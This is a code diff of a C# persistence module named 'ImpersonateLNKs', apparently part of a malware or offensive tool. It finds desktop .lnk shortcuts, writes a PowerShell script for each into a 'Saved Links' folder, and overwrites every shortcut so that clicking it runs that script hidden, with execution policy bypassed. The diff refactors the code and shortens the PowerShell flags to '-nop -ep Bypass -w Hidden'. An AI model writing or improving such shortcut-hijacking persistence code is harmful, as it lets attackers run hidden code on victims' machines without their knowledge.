@@ -6,11 +6,11 @@ namespace Main.Source.Functions.Persistence
     {
         private const string ShortcutsFolderName = "Saved Links";
 
+        private static string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        private static string shortcutsFolderPath = Path.Join(userProfile, ShortcutsFolderName);
+
         public static void Install(string path)
         {
-            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-
-            string shortcutsFolderPath = Path.Combine(userProfile, ShortcutsFolderName);
             if (!Directory.Exists(shortcutsFolderPath))
             {
                 Directory.CreateDirectory(shortcutsFolderPath);
@@ -19,7 +19,7 @@ namespace Main.Source.Functions.Persistence
             var links = FindLNKs();
             if (links.Count == 0)
             {
-                Utilities.Logger.Warn("ImpersonateLNKs.Install: there are no link files");
+                Utilities.Logger.Error("ImpersonateLNKs.Install: there are no link files");
                 return;
             }
 
@@ -32,7 +32,7 @@ namespace Main.Source.Functions.Persistence
                 }
 
                 string scriptName = Path.GetFileNameWithoutExtension(link) + ".ps1";
-                string scriptPath = Path.Combine(shortcutsFolderPath, scriptName);
+                string scriptPath = Path.Join(shortcutsFolderPath, scriptName);
 
                 var content = new StringBuilder();
                 content.AppendLine($"Set-Location -Path {info.OpenIn}");
@@ -43,7 +43,7 @@ namespace Main.Source.Functions.Persistence
 
                 Utilities.Shortcut.OverwriteShortcut(
                     Path.GetFullPath(link),
-                    target: $"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"{scriptPath}\"",
+                    target: $"powershell.exe -nop -ep Bypass -w Hidden -File \"{scriptPath}\"",
                     openIn: shortcutsFolderPath
                 );
             }
@@ -56,9 +56,6 @@ namespace Main.Source.Functions.Persistence
 
         public static int Check()
         {
-            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-
-            string shortcutsFolderPath = Path.Combine(userProfile, ShortcutsFolderName);
             if (!Directory.Exists(shortcutsFolderPath))
             {
                 return 0;
@@ -72,13 +69,14 @@ namespace Main.Source.Functions.Persistence
             var files = new List<string>();
 
             string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-
             foreach (var file in Directory.GetFiles(desktop))
             {
-                if (file.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
+                if (!file.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
                 {
-                    files.Add(file);
+                    continue;
                 }
+
+                files.Add(file);
             }
 
             return files;
